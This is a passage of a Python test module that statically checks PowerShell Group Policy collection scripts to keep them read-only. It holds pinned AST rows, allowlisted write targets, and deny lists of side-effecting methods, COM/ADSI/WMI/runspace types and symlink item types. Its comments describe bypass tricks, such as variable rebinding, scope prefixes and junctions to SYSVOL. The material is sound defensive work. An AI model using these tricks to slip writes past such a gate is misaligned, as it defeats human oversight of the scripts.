                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTaskSettingsSet -ExecutionTimeLimit $ExecutionTimeLimit ` "
                "-MultipleInstances IgnoreNew -StartWhenAvailable"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal "
                "-Settings $settings ` -Description 'Read-only GPO export, bounded retention, "
                "rotating logs and optional ZIP delivery.'"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "Get-Credential -UserName $ServiceAccount -Message 'Collection task "
                "credentials (saved only by Windows Task Scheduler)'"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if (-not $GmsaAccount) after []",
                "if (-not $Credential) after []",
            ),
        ),
        (
            (
                "Set-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName "
                "-Force:$Force -RegisterTask { if ($GmsaAccount) { Register-ScheduledTask "
                "-TaskName $TaskName -InputObject $task -Force | Out-Null } else { "
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
                "$ServiceAccount -Password $taskPassword -Force | Out-Null } }"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
            ),
        ),
        (
            "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "if ($GmsaAccount) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "if ($GmsaAccount) after []",
            ),
        ),
        (
            (
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
                "$ServiceAccount -Password $taskPassword -Force"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "else of [($GmsaAccount)]",
            ),
        ),
        (
            "Out-Null",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "else of [($GmsaAccount)]",
            ),
        ),
        (
            'Write-Host "Registered task: $TaskName"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " Account: $account; every $EveryDays day(s) at $At (host local time)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " Hard time limit: $ExecutionTimeLimit; retain $Retention exports"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "Write-Host \" Output: $OutputRoot; log: $(Join-Path $OutputRoot 'collection.log')\"",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.log'",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            'Write-Host " ZIP delivery: $CopyTo (ingest separately)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Write-Host \"Verify with: Get-ScheduledTaskInfo -TaskName '$TaskName'\"",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "catch []",
                "else of [($null -ne $previousBytes)]",
            ),
        ),
        (
            "$lock.Dispose()",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "finally",
            ),
        ),
    ),
}

# Variable qualifiers a binding may carry. `$global:` leaks to the caller's
# session; a drive (`${alias:Get-Item}`, `$env:PSModulePath`, `${function:x}`,
# `${variable:x}`, `${C:\file}` — a file write) is a provider write.
_ALLOWED_QUALIFIERS = frozenset({"", "script", "local", "private"})

# PowerShell common parameters that WRITE a named variable; an allowlisted read
# command can thereby rebind a pinned path/exec variable (Sol BL-1). Rejected
# outright (names, their unambiguous prefixes, and the -ov/-pv/... aliases).
_VARIABLE_WRITING_PARAMS = frozenset(
    {"OutVariable", "PipelineVariable", "ErrorVariable", "WarningVariable", "InformationVariable"}
)
# Canonical (full, lowercased) names; the dumper resolves every parameter token
# — including unambiguous prefixes like `-Pi` and aliases like `-ov` — to its
# full name via the cmdlet's real metadata (DeepSeek round 5).
_VARIABLE_WRITING_CANON = frozenset(p.casefold() for p in _VARIABLE_WRITING_PARAMS)

# Instance methods that cause an external side effect (file/AD/registry/object
# mutation or a stream open/write). These require a receiver that is an
# allowlisted, pinned variable; a parenthesized/command receiver (receiver_var
# null) is rejected (Sol BL-2). Pure read/string/collection methods do not.
_SIDE_EFFECTING_METHODS = frozenset(
    {
        "Delete",
        "Open",
        "OpenWrite",
        "OpenRead",
        "Create",
        "CreateEntry",
        "CreateSubdirectory",
        "Write",
        "WriteByte",
        "WriteLine",
        "CopyTo",
        "MoveTo",
        "Replace",
        "SetInfo",
        "CommitChanges",
        "Put",
        "PutEx",
        "Save",
        "SetValue",
        "DeleteValue",
        "InvokeSet",
    }
)
# Methods that end or change the lifetime of a handle/resource. Releasing the
# collection lock early (a duplicate `$lock.Dispose()` before the protected
# block, Sol round-4 BL-3) unprotects everything after it, so these are guarded
# operations too: their count AND control-flow context are pinned.
_LIFETIME_METHODS = frozenset(
    {"Dispose", "Close", "Flush", "Release", "ReleaseMutex", "Unlock", "Lock", "SetLength"}
)

# A pinned root may legitimately be bound by a `foreach ($v in ...)` loop only
# where the real script does so (Run iterates `$archive` over the expired
# exports). Any other foreach binding of a pinned root is a rebind (DeepSeek
# NEW-BL-2), as is a `foreach` whose source carries an absolute/UNC/provider
# path.
FOREACH_ALLOWED_ROOTS: dict[str, frozenset[str]] = {
    "Run-GpoLensCollection.ps1": frozenset({"archive"}),
}
# PowerShell scope prefixes stripped before a pinned-variable lookup, so
# `$script:OutputRoot` / `$global:OutputRoot` cannot dodge the pin (NEW-BL-2).
_SCOPE_PREFIXES = ("script:", "global:", "local:", "private:", "using:", "variable:")

# Every write-path argument must be exactly one of these pinned expressions per
# script (normalized). No free child data: `Join-Path $root $segment`, a
# `$env:` component, a literal/computed `..`, or `New-Item -Name` are not in the
# set and fail (Sol BL-4).
WRITE_TARGET_EXPRESSIONS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset(
        {
            "$OutputRoot",
            "$archive",
            "$dest",
            "$testFile",
            '(Join-Path $out "reports\\${safe}__$($gpo.Id).xml")',
            "(Join-Path $out 'AllGPOs.xml')",
            "(Join-Path $out 'collection-errors.json')",
            "(Join-Path $out 'gp-inheritance.json')",
            "(Join-Path $out 'gpo-inventory.json')",
            "(Join-Path $out 'gpo-metadata.json')",
            "(Join-Path $out 'group-members.json')",
            "(Join-Path $out 'ou-tree.json')",
            "(Join-Path $out 'principals.json')",
            "(Join-Path $out 'reports')",
            "(Join-Path $out 'sites.json')",
            "(Join-Path $out 'wmi-filters.json')",
        }
    ),
    "Export-GroupMembers.ps1": frozenset({"$OutputPath"}),
    "Export-Principals.ps1": frozenset({"$OutputPath"}),
    "Run-GpoLensCollection.ps1": frozenset(
        {
            "$CopyTo",
            "$LogPath",
            "$archive.FullName",
            "$delivery",
            "$folder",
            "$newest.FullName",
            "$next",
            "$old",
            "$partial",
            "(Join-Path $OutputRoot 'collection.lock')",
            "(Join-Path $exportDir 'gpo-inventory.json')",
        }
    ),
    "GpoLensCollectionMarker.ps1": frozenset({"$Marker", "$marker"}),
    "Register-GpoLensCollection.ps1": frozenset(
        {"$OutputRoot", "$marker", "(Join-Path $OutputRoot 'collection.lock')"}
    ),
}

# .NET type names (casefolded substrings) that are an AD/COM/WMI/runspace write
# or code-load surface. Rejected wherever they appear (cast, type literal,
# `using`), because such a receiver carries a write under an allowlisted
# instance-method name.
_FORBIDDEN_TYPE_SUBSTRINGS = (
    "adsi",
    "adsisearcher",
    "directoryservices",
    "directoryentry",
    "directorysearcher",
    "wscript",
    "comobject",
    "__comobject",
    "runspace",
    "powershell",
    "scriptblock",
    "wmi",
    "wmiclass",
    "wmisearcher",
    "cimsession",
    "cimclass",
    "ciminstance",
    "managementobject",
    "managementclass",
)

# File-writing commands and the bound parameters that name what they write.
# Move-Item removes its source, so both ends are write targets.
_WRITE_COMMANDS: dict[str, tuple[str, ...]] = {
    "Add-Content": ("Path", "LiteralPath"),
    "Copy-Item": ("Destination",),
    "Move-Item": ("Path", "LiteralPath", "Destination"),
    "New-Item": ("Path",),
    "Out-File": ("FilePath", "LiteralPath"),
    "Remove-Item": ("Path", "LiteralPath"),
    "Rename-Item": ("Path", "LiteralPath"),
    "Set-Content": ("Path", "LiteralPath"),
    "Tee-Object": ("FilePath", "LiteralPath"),
}
# Commands that write only when a path parameter is supplied (Get-GPOReport
# returns a string unless -Path is given — Sol get_gporeport).
_OPTIONAL_PATH_COMMANDS: dict[str, tuple[str, ...]] = {
    "Get-GPOReport": ("Path",),
}
# Static methods whose first argument is a path that may be created/written/deleted.
_WRITE_STATIC = {
    "IO.File::AppendAllText",
    "IO.File::Delete",
    "IO.File::Open",
    "IO.File::WriteAllBytes",
    "IO.File::WriteAllText",
    "IO.Compression.ZipFile::Open",
}
# New-Item item types that create a filesystem object other than a plain file or
# directory (a symlink/junction to SYSVOL re-points a confined root — Sol
# set_itemtype).
_FORBIDDEN_ITEM_TYPES = {"symboliclink", "junction", "hardlink"}
# Casefolded views of the tables above (names are canonicalized on load).
_WRITE_COMMANDS_CF = {
    k.casefold(): tuple(p.casefold() for p in v) for k, v in _WRITE_COMMANDS.items()
}
_OPTIONAL_PATH_COMMANDS_CF = {
    k.casefold(): tuple(p.casefold() for p in v) for k, v in _OPTIONAL_PATH_COMMANDS.items()
}
# A variable reference in source text: `$name`, `$scope:name`, `$drive:name` or
# `${...}`. Scope prefixes are stripped by _bare_var; a drive (env:) is kept.
_VARIABLE = re.compile(r"\$(?:\{([^}]+)\}|((?:[A-Za-z_][A-Za-z0-9_]*:)?[A-Za-z_][A-Za-z0-9_]*))")
# In a write TARGET (built from roots) any drive-qualified or UNC or `..` literal
# is illegitimate, including a single drive letter.
_ABSOLUTE_LITERAL = re.compile(r"[A-Za-z]:[\\/]|\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")
# A non-filesystem PowerShell provider qualifier (registry, cert, AD, env, ...).
_PROVIDER = re.compile(
    r"\b(?:HKLM|HKCU|HKCR|HKU|HKEY_[A-Z_]+|Cert|WSMan|Env|Variable|Function|Alias|AD):",
    re.IGNORECASE,
)
# In a parameter default or foreach source an absolute *filesystem* path is fine
# (it is the root itself); only UNC, a provider, or `..` are rejected.
_UNC_OR_DOTDOT = re.compile(r"\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")


def _cf(name: str) -> str:
    return name.casefold()


def _bare_var(name: str) -> str:
    """Casefold a variable name with any scope prefix stripped.

    ``$script:OutputRoot`` -> ``outputroot`` so a scoped assignment cannot dodge
    the pinned-variable lookup (DeepSeek NEW-BL-2).
    """
    cf = _cf(name)
    for prefix in _SCOPE_PREFIXES:
        if cf.startswith(prefix):
            return cf[len(prefix) :]
    return cf


def _vars_in(text: str | None) -> set[str]:
    return {_bare_var(a or b) for a, b in _VARIABLE.findall(text or "")}


def _normalize_type(name: str) -> str:
    """Canonical (casefolded, ``System.``-less) .NET type name."""
    cf = _cf(name)
    return cf[len("system.") :] if cf.startswith("system.") else cf


def _cfset(names: Any) -> frozenset[str]:
    return frozenset(_cf(n) for n in names)


def _method_key(type_name: str | None, member: str | None) -> str:
    return f"{_normalize_type(type_name or '')}::{_cf(member or '')}"


_WRITE_STATIC_CF = frozenset(_method_key(*k.split("::")) for k in _WRITE_STATIC)


def _canonicalize(entry: dict[str, Any]) -> dict[str, Any]:
    """Casefold every command, function, parameter, member, type and variable
    name in the semantic projections, once, as the inventory is loaded.

    PowerShell resolves all of these case-insensitively, so every comparison in
    the checks below is made against casefolded policy tables (adcs-lens found
    `_WRITEJSON` passing a check written for `_writeJson`). Source TEXT fields
    (binding right-hand sides, operation text, guard conditions) are left as
    written: they are compared verbatim, so a re-cased copy of a pinned
    expression is a new value and fails closed. ``ast_rows`` keep the source
    spelling (the golden records it).
    """
    if "commands" not in entry:
        return entry  # -AstOnly / -Sites records
    for command in entry["commands"]:
        if command["name"]:
            command["name"] = _cf(command["name"])
        command["function"] = _cf(command["function"])
        command["bound"] = {_cf(k): v for k, v in command["bound"].items()}
        for arg in command["arguments"]:
            if arg["parameter"]:
                arg["parameter"] = _cf(arg["parameter"])
    for member in entry["members"]:
        member["function"] = _cf(member["function"])
        for key in ("member", "type", "receiver_var"):
            if member[key]:
                member[key] = _cf(member[key])
    entry["functions"] = [_cf(n) for n in entry["functions"]]
    for fn in entry["function_params"]:
        fn["name"] = _cf(fn["name"])
        fn["params"] = [_cf(n) for n in fn["params"]]
        fn["pipeline_params"] = [_cf(n) for n in fn["pipeline_params"]]
    for binding in entry["variable_assignments"]:
        binding["name"] = _cf(binding["name"])
        binding["function"] = _cf(binding["function"])
    for ref in entry["variable_refs"]:
        ref["name"] = _cf(ref["name"])
        ref["drive"] = _cf(ref["drive"])
    for use in entry["variable_uses"]:
        use["name"] = _bare_var(use["name"])
        use["function"] = _cf(use["function"])
    for decl in entry["parameter_decls"]:
        decl["name"] = _cf(decl["name"])
        decl["function"] = _cf(decl["function"])
    for cond in entry["conditions"]:
        cond["function"] = _cf(cond["function"])
    for key in ("member_assignments", "index_assignments"):
        for item in entry[key]:
            item["function"] = _cf(item["function"])
            var = "receiver_var" if key == "member_assignments" else "root_var"
            if item[var]:
                item[var] = _cf(item[var])
    return entry


# ---------------------------------------------------------------------------
# Variable bindings (round-3 BL-2 / NEW-BL-1 / NEW-BL-3). Every way a variable
# can acquire a value is reduced to a binding key string:
#   "= <rhs>" / "+= <rhs>" ...   assignment (any operator)
#   "param" / "param <default>"  parameter declaration
#   "foreach <source>"           foreach loop variable
#   "ref <call>"                 [ref]$v handed to a call that may write it
#   "incdec <op>"                ++/--
#   "multi <rhs>"                $a, $b = ... (multiple assignment)
#   "arg <expr>"                 a local-function call site binds the parameter
#   "splat @<var>"               a splatted call may bind the parameter
#   "pipeline"                   a ValueFromPipeline parameter
#   "common -<Param>"            -OutVariable/-ErrorVariable/... writes it
#   "member <target> = <rhs>"    a property write on the variable's object
#   "index <target>"             an index write on the variable's object
# Every key is prefixed with the scope that makes the binding, `[<function>]`
# or `[script]` (a ForEach-Object/Where-Object/.ForEach() scriptblock runs in
# its caller's scope, so it is attributed to the enclosing function; a call-site
# argument belongs to the callee's scope). A pinned binding copied into another
# function is therefore a new key. Variable names are casefolded with scope
# prefixes (`$script:`) stripped.
# ---------------------------------------------------------------------------

_ASSIGN_OPERATORS = {
    "Equals": "=",
    "PlusEquals": "+=",
    "MinusEquals": "-=",
    "MultiplyEquals": "*=",
    "DivideEquals": "/=",
    "RemainderEquals": "%=",
    "QuestionQuestionEquals": "??=",
}
# PowerShell common parameters an advanced function accepts implicitly.
_COMMON_PARAMETERS = (
    "Debug",
    "ErrorAction",
    "ErrorVariable",
    "InformationAction",
    "InformationVariable",
    "OutBuffer",
    "OutVariable",
    "PipelineVariable",
    "ProgressAction",
    "Verbose",
    "WarningAction",
    "WarningVariable",
    "WhatIf",
    "Confirm",
)


def _binding_key(binding: dict[str, Any]) -> str:
    kind = binding["kind"]
    rhs = _norm(binding["rhs"])
    if kind == "assign":
        op = _ASSIGN_OPERATORS.get(binding["operator"], binding["operator"])
        return f"{op} {rhs}"
    if kind == "param":
        return f"param {rhs}".rstrip()
    if kind == "incdec":
        return f"incdec {binding['operator']}"
    return f"{kind} {rhs}".rstrip()


def _resolve_param(token: str, params: list[str]) -> str | None:
    """The parameter a `-token` binds to (exact name, else unique prefix)."""
    cf = _cf(token)
    exact = [p for p in params if _cf(p) == cf]
    if exact:
        return exact[0]
    prefixed = [p for p in params if _cf(p).startswith(cf)]
    return prefixed[0] if len(prefixed) == 1 else None


def _callable_functions(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, dict[str, Any]]:
    """casefolded name -> function_params record, for in-file and dot-sourced functions."""
    found: dict[str, dict[str, Any]] = {}
    for source in (script, *POLICIES[script].dot_sources):
        for fn in inv[source]["function_params"]:
            found[_cf(fn["name"])] = fn
    return found


def _scope(function: str | None) -> str:
    return f"[{_cf(function)}]" if function else "[script]"


def _call_site_bindings(
    script: str, inv: dict[str, dict[str, Any]]
) -> tuple[list[tuple[str, str]], list[str]]:
    """([(param, scoped binding key)], [unresolvable call-site arguments])."""
    functions = _callable_functions(script, inv)
    bindings: list[tuple[str, str]] = []
    unresolved: list[str] = []
    for command in inv[script]["commands"]:
        fn = functions.get(_cf(command["name"] or ""))
        if fn is None:
            continue
        params: list[str] = list(fn["params"])
        scope = _scope(fn["name"])
        explicit: set[str] = set()
        positional: list[str] = []
        splats: list[str] = []
        for arg in command["arguments"]:
            value = arg["value"]
            if arg["parameter"] is None:
                if arg["value_kind"] == "VariableExpressionAst" and str(value).startswith("@"):
                    splats.append(str(value))
                else:
                    positional.append(_norm(value))
                continue
            param = _resolve_param(str(arg["parameter"]), params)
            if param is None:
                if _resolve_param(str(arg["parameter"]), list(_COMMON_PARAMETERS)) is not None:
                    continue  # common parameter; variable-writing ones are checked separately
                unresolved.append(f"line {command['line']}: {command['name']} -{arg['parameter']}")
                continue
            explicit.add(param)
            bindings.append(
                (
                    param,
                    f"{scope} arg {_norm(value)}" if value is not None else f"{scope} arg switch",
                )
            )
        free = [p for p in params if p not in explicit]
        for i, value in enumerate(positional):
            if i < len(free):
                bindings.append((free[i], f"{scope} arg {value}"))
            else:
                bindings.append(("args", f"{scope} arg {value}"))
        for splat in splats:
            for param in free:
                bindings.append((param, f"{scope} splat {splat}"))
        for param in fn["pipeline_params"]:
            bindings.append((param, f"{scope} pipeline"))
    return bindings, unresolved


def _all_bindings(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, set[str]]:
    entry = inv[script]
    out: dict[str, set[str]] = {}

    def add(name: str, key: str) -> None:
        out.setdefault(_bare_var(name), set()).add(key)

    for binding in entry["variable_assignments"]:
        if _bare_var(binding["name"]) == "null":
            continue  # `$null = ...` discards output; it cannot rebind anything
        add(binding["name"], f"{_scope(binding['function'])} {_binding_key(binding)}")
    params, _ = _call_site_bindings(script, inv)
    for param, key in params:
        add(param, key)
    for write in _common_param_writes(entry):
        add(write["target"], f"{_scope(write['function'])} common -{write['parameter']}")
    for member in entry["member_assignments"]:
        if member["receiver_var"]:
            add(
                member["receiver_var"],
                f"{_scope(member['function'])} member {_norm(member['target'])}",
            )
    for index in entry["index_assignments"]:
        if index["root_var"]:
            add(index["root_var"], f"{_scope(index['function'])} index {_norm(index['target'])}")
    return out


# Variables the engine sets that a pinned value may read without being pinned
# itself. None of them may be bound by the scripts (check_bindings refuses any
# binding of an automatic/preference variable that is not in SPECIAL_BINDINGS).
_AUTO_READ_OK = frozenset(
    {
        "_",
        "psitem",
        "true",
        "false",
        "null",
        "psscriptroot",
        "pscmdlet",
        "myinvocation",
        "pid",
        "lastexitcode",
        "matches",
        "env:systemroot",
    }
)


def _required_vars(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, str]:
    """Variables whose every binding must be pinned, with the first reason.

    Roots: write roots, variables in pinned write-target expressions, receivers
    of every instance-method call / property write / index write, splatted
    variables, every variable read by any command argument, .NET call argument
    or branch/loop condition, and dot-sourced function parameters pinned by
    their defining script. Then the closure: every variable read by any
    binding of a required variable. check_pinned_bindings requires PINNED_VARS
    to cover this set exactly.
    """
    entry = inv[script]
    reasons: dict[str, str] = {}

    def need(name: str | None, why: str) -> None:
        if not name:
            return
        bare = _bare_var(name)
        if bare not in reasons:
            reasons[bare] = why

    for root in WRITE_ROOTS[script]:
        need(root, "write root")
    for expr in sorted(WRITE_TARGET_EXPRESSIONS[script]):
        for var in sorted(_vars_in(expr)):
            need(var, f"write target {expr}")
    for member in entry["members"]:
        if not member["static"]:
            need(member["receiver_var"], f"receiver of .{member['member']}()")
    for member in entry["member_assignments"]:
        need(member["receiver_var"], f"property write {member['target']}")
    for index in entry["index_assignments"]:
        need(index["root_var"], f"index write {index['target']}")
    for ref in entry["variable_refs"]:
        if ref["splatted"]:
            need(ref["name"], "splatted")
    # Every variable read by ANY command argument, .NET call argument or
    # branch/loop condition (Sol round 6: `$metaPath = '\\host\share\x'` left
    # `Get-Content -LiteralPath $metaPath` textually pinned but reading a remote
    # path; `$Unregister = $true` flipped the guard of Unregister-ScheduledTask).
    for command in entry["commands"]:
        if not command["name"]:
            for var in sorted(_vars_in(command["text"])):
                need(var, f"dynamic invocation {_norm(command['text'])}")
        for arg in command["arguments"]:
            for var in sorted(_vars_in(arg["value"])):
                need(var, f"argument of {command['name'] or 'a dynamic invocation'}")
    for member in entry["members"]:
        for text in member["arguments"]:
            for var in sorted(_vars_in(text)):
                need(var, f"argument of .{member['member']}()")
    for cond in entry["conditions"]:
        for var in sorted(_vars_in(cond["text"])):
            need(var, f"condition {cond['text'][:60]}")
    for source in POLICIES[script].dot_sources:
        for fn in inv[source]["function_params"]:
            for param in fn["params"]:
                if param in PINNED_VARS[source]:
                    need(param, f"parameter of {fn['name']} (pinned in {source})")
    bindings = _all_bindings(script, inv)
    pending = list(reasons)
    while pending:
        var = pending.pop()
        for key in sorted(bindings.get(var, set())):
            for ref in sorted(_vars_in(key)):
                if ref not in reasons:
                    reasons[ref] = f"read by a binding of ${var}"
                    pending.append(ref)
    return {var: why for var, why in reasons.items() if var not in _AUTO_READ_OK}


def _pwsh() -> str:
    exe = shutil.which("pwsh")
    if exe is None:
        if os.environ.get("CI"):
            pytest.fail("pwsh is required in CI for the collector read-only gate")
        pytest.skip("pwsh not installed; CI runs this gate (ubuntu runners ship pwsh)")
    return exe


def _run_dumper_raw(exe: str, paths: list[str], *flags: str, timeout: int = 120) -> Any:
    result = subprocess.run(
        [exe, "-NoProfile", "-NonInteractive", "-File", str(_DUMPER), *flags, *paths],
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
